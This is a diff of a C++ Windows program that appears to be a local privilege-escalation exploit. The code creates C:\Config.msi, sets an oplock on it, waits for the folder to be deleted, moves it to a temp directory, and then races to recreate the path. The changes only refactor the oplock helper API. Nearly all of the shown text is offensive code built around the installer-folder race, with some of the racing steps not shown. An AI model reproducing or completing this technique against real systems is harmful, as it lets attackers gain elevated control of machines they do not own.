@@ -59,15 +59,15 @@ int wmain(int argc, wchar_t* argv[])
 		auto installer_folder_path = LR"(C:\Config.msi)"s;
 		std::wcout << std::format(L"[*] Creating {} and setting oplock...", installer_folder_path) << std::endl;
 		std::filesystem::create_directory(installer_folder_path);
-		auto oplock_data = owl::oplock::set_oplock(installer_folder_path, 0, false, GENERIC_READ | DELETE, true);
+		auto oplock = owl::oplock::Oplock::set_oplock(installer_folder_path, 0, false, GENERIC_READ | DELETE, true);
 		std::wcout << L"[+] Folder created and oplock set." << std::endl;
 
 		std::wcout << L"[*] Waiting for folder deletion to trigger oplock..." << std::endl;
-		oplock_data.trigger.wait();
+		oplock.wait();
 		std::wcout << L"[+] Oplock triggered." << std::endl;
 
 		std::wcout << std::format(L"[*] Moving {} to temp dir...", installer_folder_path) << std::endl;
-		auto new_path = owl::misc::move_to_temp_dir(oplock_data.handle.get());
+		auto new_path = owl::misc::move_to_temp_dir(oplock.get_file_handle());
 		std::wcout << std::format(L"[+] Folder moved to {}.", new_path) << std::endl;
 
 		std::wcout << L"[*] Racing to perform the following actions:" << std::endl;
@@ -100,7 +100,7 @@ int wmain(int argc, wchar_t* argv[])
 				return std::filesystem::exists(installer_folder_path, e);
 			});
 
-		oplock_data.handle.reset();
+		oplock.release();
 
 		owl::misc::loop_with_timeout(2s, [&]()
 			{
